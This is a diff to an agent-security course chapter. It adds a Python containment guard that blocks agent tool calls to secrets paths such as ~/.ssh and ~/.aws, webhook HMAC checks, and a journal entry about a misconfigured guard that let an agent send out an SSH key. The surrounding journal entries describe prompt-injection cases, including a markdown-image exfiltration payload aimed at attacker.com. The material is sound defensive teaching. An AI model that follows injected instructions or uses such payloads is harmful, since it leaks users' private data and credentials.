@@ -1,7 +1,7 @@
 ---
 title: Week 11.5 - Agent Security
 created: 2026-04-30
-updated: 2026-04-30
+updated: 2026-05-14
 tags:
   - agent
   - security
@@ -425,6 +425,187 @@ mkdir agent_security_lab && cd agent_security_lab
 
 ---
 
+## §11.5.Y Containment Zones (PreToolUse Guard) + Trigger Surface as Auth Boundary
+
+### Motivation
+
+Agent security has two distinct layers that beginners conflate. **Prompt-level guardrails** tell the model what not to do — "do not read ~/.ssh", "do not call external webhooks". They rely on the model's compliance, which is variable, fine-tuned away by adversarial prompts, and inadequate for regulated environments. **Execution-level guardrails** hook the tool dispatch path and DETERMINISTICALLY refuse risky operations — the model can be perfectly jailbroken and the operation still does not happen, because the harness rejected it before any side effect. PreToolUse hooks are non-negotiable for production agents. Separately, every *trigger* that can start an agent run (cron schedule, inbound webhook, manual UI click) is an auth boundary. An attacker who can forge a cron-style invocation or replay a webhook gets the agent's capabilities for free. Production-grade agents defend the trigger surface as carefully as any other API endpoint.
+
+### Architecture
+
+**Pane A — Tool dispatch with ContainmentGuard:**
+
+```mermaid
+flowchart LR
+    LLM[LLM produces<br/>tool call] --> H[PreToolUse hook<br/>ContainmentGuard]
+    H --> Z{path-zone<br/>check}
+    Z -->|cross-zone<br/>or secrets-zone| BLOCK[BLOCK<br/>deterministic refuse<br/>+ audit log]
+    Z -->|same-zone| ALLOW[ALLOW]
+    ALLOW --> EXEC[Tool execution]
+    BLOCK --> RET[Return error<br/>to agent loop]
+```
+
+**Pane B — Trigger surface as auth boundary:**
+
+```mermaid
+flowchart LR
+    CRON[cron trigger] -->|"system identity<br/>(no human in loop)"| AUTH
+    WEBHOOK[inbound webhook] -->|"HMAC signature<br/>required"| AUTH
+    MANUAL[manual UI click] -->|"human-in-loop<br/>confirmation"| AUTH
+    AUTH[Auth boundary] --> RUNTIME[Durable runtime<br/>W4.6]
+    RUNTIME --> AGENT[Agent run]
+```
+
+### Code
+
+**Code:**
+
+```python
+# containment_zones.py
+"""
+Containment zones — structural privacy at the PreToolUse hook layer.
+Source convergence: PAI (Personal_AI_Infrastructure) containment-zones.ts +
+AutoGPT Platform executor/scheduler.py trigger surface.
+"""
+from __future__ import annotations
+from dataclasses import dataclass
+from pathlib import Path
+import hmac, hashlib, time
+from typing import Callable
+
+# --- Zone configuration -----------------------------------------------------
+
+ZONES: dict[str, list[str]] = {
+    "work":     ["~/Projects/work"],
+    "personal": ["~/Projects/personal"],
+    "secrets":  ["~/.ssh", "~/.aws", "~/.config/gh"],  # load-bearing example
+}
+
+# Default policy: cross-zone access denied. Secrets-zone access denied to ALL
+# zones unless the operator's policy explicitly grants it (it shouldn't).
+def _expand(p: str) -> Path:
+    return Path(p).expanduser().resolve()
+
+def _zone_for_path(path: str) -> str | None:
+    abs_path = _expand(path)
+    for zone, prefixes in ZONES.items():
+        for prefix in prefixes:
+            try:
+                abs_path.relative_to(_expand(prefix))
+                return zone
+            except ValueError:
+                continue
+    return None  # unzoned — fall through to per-call policy
+
+# --- ContainmentGuard -------------------------------------------------------
+
+class ContainmentViolation(Exception):
+    """Raised when a tool call crosses a containment-zone boundary."""
+
+@dataclass(frozen=True)
+class ContainmentGuard:
+    """Deterministic PreToolUse guard. No prompting, no model compliance."""
+    active_zone: str  # zone this session is bound to at session-start
+
+    def check(self, operation: str, path: str) -> bool:
+        target = _zone_for_path(path)
+        # Rule 1: secrets zone is never accessible from a non-secrets session.
+        if target == "secrets" and self.active_zone != "secrets":
+            raise ContainmentViolation(
+                f"BLOCK: {operation} on {path!r} — secrets zone is unreachable "
+                f"from active_zone={self.active_zone!r}"
+            )
+        # Rule 2: any cross-zone access is denied.
+        if target is not None and target != self.active_zone:
+            raise ContainmentViolation(
+                f"BLOCK: {operation} on {path!r} — target zone={target!r} "
+                f"crosses active_zone={self.active_zone!r}"
+            )
+        return True
+
+    @staticmethod
+    def validate_config() -> None:
+        """Boot-time validation. Fail-stop if zones are misconfigured."""
+        if not ZONES:
+            raise RuntimeError("ContainmentGuard: zones empty — refusing to start")
+        if "secrets" not in ZONES:
+            raise RuntimeError("ContainmentGuard: 'secrets' zone missing")
+        for zone, prefixes in ZONES.items():
+            for prefix in prefixes:
+                if not str(prefix).startswith("~") and not str(prefix).startswith("/"):
+                    raise RuntimeError(f"ContainmentGuard: bad prefix {prefix!r} in {zone}")
+
+# --- PreToolUse hook integration with W4.6 durable runtime ------------------
+
+class PreToolUseHook:
+    """Wired into the durable runtime's tool dispatcher (see W4.6)."""
+    def __init__(self, guard: ContainmentGuard):
+        self.guard = guard
+
+    def __call__(self, tool_name: str, args: dict) -> None:
+        path_args = [v for k, v in args.items() if k in ("path", "file", "src", "dst")]
+        for p in path_args:
+            self.guard.check(tool_name, p)  # raises ContainmentViolation on deny
+
+# Example wiring in the tool dispatcher (W4.6 pattern):
+#   def dispatch(tool_name, args):
+#       pre_tool_use_hook(tool_name, args)   # may raise — deterministic block
+#       return TOOLS[tool_name](**args)
+
+# --- Trigger surface as auth boundary --------------------------------------
+
+WEBHOOK_SECRET = b"<rotated-per-deploy>"
+
+def verify_webhook_trigger(body: bytes, header_sig: str) -> None:
+    """Webhook triggers require HMAC signature. Unverified → reject."""
+    expected = hmac.new(WEBHOOK_SECRET, body, hashlib.sha256).hexdigest()
+    if not hmac.compare_digest(expected, header_sig):
+        raise PermissionError("BLOCK: webhook signature invalid")
+
+def cron_trigger_identity() -> str:
+    """Cron triggers run as system identity — no human in loop, narrowest caps."""
+    return "system:cron"  # capability token minted with read-only zone scope
+
+def manual_trigger_confirm(action_summary: str) -> bool:
+    """Manual triggers require human-in-loop confirmation before agent runs."""
+    response = input(f"Confirm trigger? [{action_summary}] (yes/no): ")
+    return response.strip().lower() == "yes"
+
+# --- Boot sequence ----------------------------------------------------------
+
+if __name__ == "__main__":
+    ContainmentGuard.validate_config()  # fail-stop if config is wrong
+    guard = ContainmentGuard(active_zone="work")
+    hook = PreToolUseHook(guard)
+    # Smoke test: secrets-zone read must block deterministically.
+    try:
+        hook("read_file", {"path": "~/.ssh/id_rsa"})
+    except ContainmentViolation as e:
+        print(f"[smoke] expected block: {e}")
+```
+
+**Walkthrough:**
+
+**Block 1 — `ZONES` config + `_zone_for_path`.** Path-prefix matching is intentional rather than glob/regex. Prefix matching is deterministic, fast, and impossible to mis-anchor; glob matching has corner cases (`**/foo` semantics differ across libraries) that are unsafe in a security boundary. The `secrets` zone is enumerated separately and tested in `validate_config()` so a typo in the config can't silently turn it off.
+
+**Block 2 — `ContainmentGuard.check`.** This is the load-bearing function. It does *not* prompt the model; it does *not* ask the model to comply. It raises a `ContainmentViolation` that propagates up through the tool dispatcher and aborts the call. The model's reasoning trace will see an error and may try a different approach — but the destructive operation has not happened. This is the prompt-vs-hook distinction: prompt-level mitigation degrades under adversarial input; hook-level mitigation does not.
+
+**Block 3 — `validate_config()` at boot.** Without boot-time validation, a misconfigured `ZONES` dict (empty, missing `secrets`, malformed prefix) produces a silently-permissive guard. The agent runs, the operator believes containment is enforced, and exfiltration is one prompt-injection away. Fail-stop at boot is the only safe default — see BCJ Entry 5.
+
+**Block 4 — `PreToolUseHook` wiring.** The hook reads conventional path-shaped argument keys (`path`, `file`, `src`, `dst`). In production this list is extended to match the actual tool registry. The hook is called *before* the tool body runs — that is the entire point of the "Pre" in PreToolUse. Post-execution audit is also valuable but cannot prevent the side effect that already occurred.
+
+**Block 5 — Trigger surface auth.** Three trigger classes, three different auth mechanisms. Webhooks need HMAC because an attacker can craft an HTTP request from anywhere; cron runs as system identity because no human can authenticate it in real time, and so it must be scoped narrowly (read-only zone, no write tools); manual triggers require human-in-loop confirmation because that's the entire point of "manual". Conflating these — e.g., treating a webhook trigger as if it had cron's narrow scope OR manual's audit trail — is the classic trigger-surface bug.
+
+**Result:** placeholder until the 10-prompt red-team probe set runs. Expected: 10/10 cross-zone read attempts blocked (`~/.ssh/id_rsa`, `~/.aws/credentials`, `~/Projects/personal/diary.md` from a `work`-zone session, `~/Projects/work/secrets.env` from a `personal`-zone session, etc.). Deterministic guard → 100% block rate is the only acceptable number. Any non-100% indicates a missing path-arg key or a zone-config gap, not a "tunable" classifier threshold.
+
+`★ Insight ─────────────────────────────────────`
+- **2-repo convergence (PAI + AutoGPT)**: PAI's `containment-zones.ts` proves the pattern works in personal AI infra; AutoGPT's `executor/scheduler.py` proves the trigger-surface concern is real in multi-tenant production. Independent designs, same conclusion.
+- **Prompt-vs-hook layer distinction**: prompt-level "do not read ~/.ssh" is advisory; hook-level `ContainmentGuard.check` is structural. The model can be jailbroken — the hook cannot be jailbroken without code access.
+- **Trigger surface is a separate auth boundary**: the agent loop's threat model is incomplete if it only models the LLM↔tool boundary and ignores how the loop got started in the first place. Cron, webhook, and manual all require distinct auth treatment.
+`─────────────────────────────────────────────────`
+
+---
+
 ## Bad-Case Journal
 
 **Entry 1 — ChatGPT Browsing, 2023.** When Bing Chat (GPT-4 with browsing) was released, security researcher Johann Rehberger demonstrated that a webpage could embed hidden instructions that the model would read during browsing. The instructions directed the model to render a markdown image tag with the user's chat history as a URL parameter: `![x](https://attacker.com/exfil?data=USER_HISTORY)`. Some clients rendered the image, making a GET request with the encoded PII. Microsoft patched the rendering, but the underlying retrieval injection remains a category-level vulnerability.
@@ -434,6 +615,11 @@ mkdir agent_security_lab && cd agent_security_lab
 **Entry 3 — Customer Service Agent, PDF RAG Injection, 2024.** A financial services firm deployed an agent with document corpus access and an outbound email tool. An attacker submitted a support ticket with a PDF containing hidden injection instructions. When the agent retrieved documents to answer subsequent queries, the injected instructions were included. The email tool had no recipient validation. Discovered during a compliance audit, not during operation.
 
 **Entry 4 — Claude Computer Use Beta, 2024.** Researchers demonstrated that a screenshot of a webpage containing terminal-command-like text could cause the agent to execute that command if it was performing web research. The agent read the OCR'd text as instruction. Anthropic added explicit prompting to treat visual content as untrusted. Broader lesson: any modality the model reads is an injection surface.
+
+**Entry 5 — ContainmentGuard config wrong, agent silently runs without enforcement.**
+*Symptom:* The agent appears to behave correctly — file ops succeed, no exceptions surface in logs. Operator believes containment zones are enforced because the `containment_zones.py` module is imported at startup. Post-incident audit shows the agent successfully read `~/.ssh/id_rsa` and POSTed it via `make_http_request` two weeks ago; no `ContainmentViolation` was ever raised.
+*Root cause:* The `ZONES` dict was loaded from a YAML config that was missing the `secrets` key (typo: `secret:` instead of `secrets:`). `_zone_for_path("~/.ssh/id_rsa")` returned `None` (unzoned), so the `check()` Rule-1 branch never fired. The guard fell open. There was no boot-time validation, so the misconfiguration was invisible until forensics.
+*Fix:* Add `ContainmentGuard.validate_config()` as a fail-stop call at process startup — before any tool is registered, before the durable runtime accepts triggers. Validation asserts (a) `ZONES` is non-empty, (b) `secrets` key is present, (c) every prefix is absolute or `~`-anchored. Any failure raises `RuntimeError` and the process exits non-zero, so the supervisor will not mark the agent healthy. Pair with a synthetic smoke test on boot: attempt a `~/.ssh/id_rsa` read with `active_zone="work"`; require the call to raise `ContainmentViolation`. If it does not raise, the guard is broken — refuse to start.
 
 ---
 
@@ -469,6 +655,8 @@ mkdir agent_security_lab && cd agent_security_lab
 **Sets up: W12 — Capstone.** The W12 capstone agent must include a security review section: threat model diagram identifying all four trust tiers, evidence that every tool has a Pydantic schema with tested validation, and a red-team table showing at least three attacks blocked.
 
 **Distinguish from: W9 — Faithfulness Checker.** W9 addresses correctness (epistemic). A faithfully-cited response can still be a prompt injection. Security threat model is orthogonal to faithfulness evaluation; both are required in production.
+
+**Connects to: [[Week 4.6 - Durable Agent Runtime and Process Topologies]].** The PreToolUse hook integration in §11.5.Y wires `ContainmentGuard` into the W4.6 durable runtime's tool dispatcher. The trigger surface (cron / webhook / manual) defined as an auth boundary in §11.5.Y is the same surface W4.6 treats as the agent's entry point — W4.6 covers the durability story; W11.5 covers the auth story for those triggers. The two chapters are co-required for any production-grade durable agent.
 
 
 ---
